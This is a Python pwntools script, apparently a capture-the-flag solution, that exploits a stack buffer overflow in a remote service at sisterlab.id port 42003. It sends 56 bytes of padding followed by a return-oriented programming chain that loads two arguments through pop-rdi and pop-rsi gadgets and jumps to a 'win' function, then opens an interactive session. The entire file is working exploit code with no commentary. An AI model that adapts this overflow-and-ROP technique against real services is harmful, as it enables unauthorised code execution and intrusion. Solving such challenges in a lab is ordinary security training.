from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'


# elf = ELF('./client')
io = remote("sisterlab.id", 42003)

win_addr = 0x40118a
string_gyatt_rizz_addr = 0x40300f
a = 0xcafecafe

pop_rsi_ret = 0x401188
pop_rdi_ret = 0x401186

padding = b'A' * 56
ret_gadget = 0x401170

rop_chain = b''
rop_chain += p64(pop_rdi_ret)
rop_chain += p64(a)
rop_chain += p64(pop_rsi_ret)
rop_chain += p64(string_gyatt_rizz_addr)
rop_chain += p64(win_addr)

payload = padding + rop_chain

io.sendlineafter(b"What is your name?\n> ", payload)

io.send(b"\n")
print("This is the win addr ", win_addr)

io.interactive()


